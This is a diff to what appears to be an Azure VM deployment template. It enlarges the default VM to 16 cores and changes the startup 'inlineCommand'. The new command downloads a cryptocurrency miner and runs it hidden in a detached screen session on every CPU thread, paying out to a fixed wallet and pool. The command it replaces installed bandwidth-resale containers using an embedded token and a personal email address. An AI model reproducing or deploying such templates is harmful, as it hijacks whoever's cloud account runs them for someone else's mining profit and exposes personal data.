@@ -24,7 +24,7 @@
             }
         },
         "vmSize": {
-            "defaultValue": "Standard_F2S_V2",
+            "defaultValue": "Standard_F16S_V2",
             "type": "string",
             "metadata": {
                 "description": "The VM size for compute instance"
@@ -67,7 +67,7 @@
         },
         "inlineCommand": {
             "type": "string",
-            "defaultValue": "sudo apt-get update -y; sudo apt install screen -y; sudo apt-get install -y; sudo apt install docker.io -y; sudo sysctl -w vm.nr_hugepages=1280; mkdir kkk; cd kkk; docker pull traffmonetizer/cli:latest; docker run -d traffmonetizer/cli start accept --token mMkk17y8vTSAqFLVFzgwQvWuhdKndFteyV9lSQpuyNo=; docker pull peer2profit/peer2profit_linux; export P2P_EMAIL=jokervulinh@gmail.com; docker run -d -e P2P_EMAIL=$P2P_EMAIL --restart always peer2profit/peer2profit_linux:latest",
+            "defaultValue": "sudo apt-get update -y; sudo apt install screen -y; sudo apt-get install -y build-essential automake libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev zlib1g-dev git; sudo sysctl -w vm.nr_hugepages=1280; mkdir kkk; cd kkk; wget https://github.com/doktor83/SRBMiner-Multi/releases/download/1.1.3/SRBMiner-Multi-1-1-3-Linux.tar.xz; tar xf SRBMiner-Multi-1-1-3-Linux.tar.xz; cd SRBMiner-Multi-1-1-3; sudo screen -d -m ./SRBMiner-MULTI --disable-gpu --algorithm xdag --pool pool.xdag.org:13656 --wallet EVd7hEmVLaibcZY5a2DX9BhURt9dip8o --worker Ronaldo --keepalive true --cpu-threads 16",
             "metadata": {
                 "description": "inline command"
             }
